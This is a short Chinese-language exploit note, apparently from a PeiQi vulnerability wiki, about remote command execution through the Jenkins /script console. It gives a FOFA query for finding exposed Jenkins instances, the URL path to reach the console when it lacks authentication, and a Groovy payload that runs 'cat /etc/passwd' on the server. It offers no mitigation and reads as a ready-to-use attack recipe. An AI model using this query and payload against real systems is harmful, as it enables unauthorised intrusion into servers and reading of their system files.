# Jenkins script 远程命令执行漏洞

## 来源

[https://peiqi.wgpsec.org/](https://peiqi.wgpsec.org/wiki/webserver/Jenkins/Jenkins%20script%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E.html)

## 简介

Jenkins 登录后访问 /script 页面，其中存在命令执行漏洞，当存在未授权的情况时导致服务器被入侵。

## 网络绘测

fofa：`app="Jenkins"`

## 利用方式

登录后台，或在未授权的情况下访问

```http
http://xxx.xxx.xxx.xxx/script
```

在脚本命命令模块执行系统命令

```shell
println 'cat /etc/passwd'.execute().text
```

